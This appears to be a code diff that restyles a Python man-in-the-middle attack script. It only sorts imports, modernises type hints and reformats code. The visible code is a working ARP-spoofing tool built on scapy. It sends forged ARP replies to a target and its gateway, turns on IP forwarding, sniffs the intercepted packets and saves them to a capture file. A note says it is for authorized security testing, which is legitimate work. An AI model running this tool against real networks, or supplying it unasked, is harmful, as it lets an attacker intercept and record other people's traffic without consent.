@@ -33,13 +33,13 @@ License: Proprietary
 Version: 1.0.0
 """
 
-import os
-import sys
-import time
-import signal
 import argparse
 import ipaddress
-from typing import Optional, Dict, Any
+import os
+import signal
+import sys
+import time
+from typing import Any
 
 # Add parent directory to path
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
@@ -47,21 +47,23 @@ try:
     from logger import get_logger
 except ImportError:
     import logging
+
     def get_logger(name):
         logger = logging.getLogger(name)
         if not logger.handlers:
             handler = logging.StreamHandler()
-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+            formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
             handler.setFormatter(formatter)
             logger.addHandler(handler)
             logger.setLevel(logging.INFO)
         return logger
 
+
 logger = get_logger(__name__)
 
 # Import scapy
 try:
-    from scapy.all import ARP, Ether, sendp, sniff, wrpcap, conf, get_if_hwaddr
+    from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, sniff, wrpcap
 except ImportError:
     logger.error("This script requires the scapy library.")
     logger.error("Install it using: pip install scapy")
@@ -82,13 +84,15 @@ class MITMAttack:
         capture_file (Optional[str]): File to save captured packets
     """
 
-    def __init__(self,
-                 target_ip: str,
-                 gateway_ip: str,
-                 interface: str,
-                 interval: float = 1.0,
-                 capture_file: Optional[str] = None,
-                 verbose: bool = False):
+    def __init__(
+        self,
+        target_ip: str,
+        gateway_ip: str,
+        interface: str,
+        interval: float = 1.0,
+        capture_file: str | None = None,
+        verbose: bool = False,
+    ):
         """
         Initialize the MITM attack simulator.
 
@@ -137,7 +141,7 @@ class MITMAttack:
         # Enable IP forwarding
         self._enable_ip_forwarding()
 
-        logger.info(f"Initialized MITM attack")
+        logger.info("Initialized MITM attack")
         logger.info(f"Target: {target_ip}, Gateway: {gateway_ip}")
         logger.info(f"Interface: {interface}, Attacker MAC: {self.attacker_mac}")
         if capture_file:
@@ -167,7 +171,7 @@ class MITMAttack:
         except Exception as e:
             logger.warning(f"Could not disable IP forwarding: {e}")
 
-    def _get_mac(self, ip: str) -> Optional[str]:
+    def _get_mac(self, ip: str) -> str | None:
         """Get MAC address for an IP using ARP request."""
         try:
             arp_request = ARP(pdst=ip)
@@ -184,15 +188,15 @@ class MITMAttack:
 
     def _poison_target(self, target_ip: str, target_mac: str, spoof_ip: str):
         """Send ARP poison packet to target."""
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                    psrc=spoof_ip, hwsrc=self.attacker_mac)
-        sendp(Ether(dst=target_mac)/packet, iface=self.interface, verbose=0)
+        packet = ARP(
+            op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=self.attacker_mac
+        )
+        sendp(Ether(dst=target_mac) / packet, iface=self.interface, verbose=0)
 
     def _restore_target(self, target_ip: str, target_mac: str, source_ip: str, source_mac: str):
         """Restore ARP table of target."""
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                    psrc=source_ip, hwsrc=source_mac)
-        sendp(Ether(dst=target_mac)/packet, iface=self.interface, count=5, verbose=0)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+        sendp(Ether(dst=target_mac) / packet, iface=self.interface, count=5, verbose=0)
 
     def _packet_callback(self, packet):
         """Callback for sniffed packets."""
@@ -205,7 +209,7 @@ class MITMAttack:
             else:
                 logger.debug(f"Packet: {packet.summary()}")
 
-    def execute(self) -> Dict[str, Any]:
+    def execute(self) -> dict[str, Any]:
         """
         Execute the MITM attack.
 
@@ -265,10 +269,12 @@ class MITMAttack:
         finally:
             # Cleanup
             logger.info("Restoring ARP tables...")
-            self._restore_target(self.target_ip, self.target_mac,
-                               self.gateway_ip, self.gateway_mac)
-            self._restore_target(self.gateway_ip, self.gateway_mac,
-                               self.target_ip, self.target_mac)
+            self._restore_target(
+                self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac
+            )
+            self._restore_target(
+                self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac
+            )
 
             self._disable_ip_forwarding()
 
@@ -283,13 +289,13 @@ class MITMAttack:
                 "success": True,
                 "duration_seconds": duration,
                 "poison_packets_sent": poison_count,
-                "packets_captured": len(self.captured_packets)
+                "packets_captured": len(self.captured_packets),
             }
 
             self._print_summary(stats)
             return stats
 
-    def _print_summary(self, stats: Dict[str, Any]):
+    def _print_summary(self, stats: dict[str, Any]):
         """Print attack summary."""
         logger.info("=" * 50)
         logger.info("MITM Attack Summary")
@@ -304,17 +310,17 @@ def parse_arguments() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         description="Man-in-the-Middle (MITM) Attack Simulation",
-        epilog="IMPORTANT: Use only for authorized security testing."
+        epilog="IMPORTANT: Use only for authorized security testing.",
     )
 
     parser.add_argument("-t", "--target", required=True, help="Target IP address")
     parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
     parser.add_argument("-i", "--interface", required=True, help="Network interface")
-    parser.add_argument("--interval", type=float, default=1.0,
-                       help="ARP poison interval in seconds (default: 1.0)")
+    parser.add_argument(
+        "--interval", type=float, default=1.0, help="ARP poison interval in seconds (default: 1.0)"
+    )
     parser.add_argument("--capture", help="Save captured packets to file")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                       help="Enable verbose output")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
 
     return parser.parse_args()
 
@@ -336,7 +342,7 @@ def main():
             interface=args.interface,
             interval=args.interval,
             capture_file=args.capture,
-            verbose=args.verbose
+            verbose=args.verbose,
         )
 
         attack.execute()
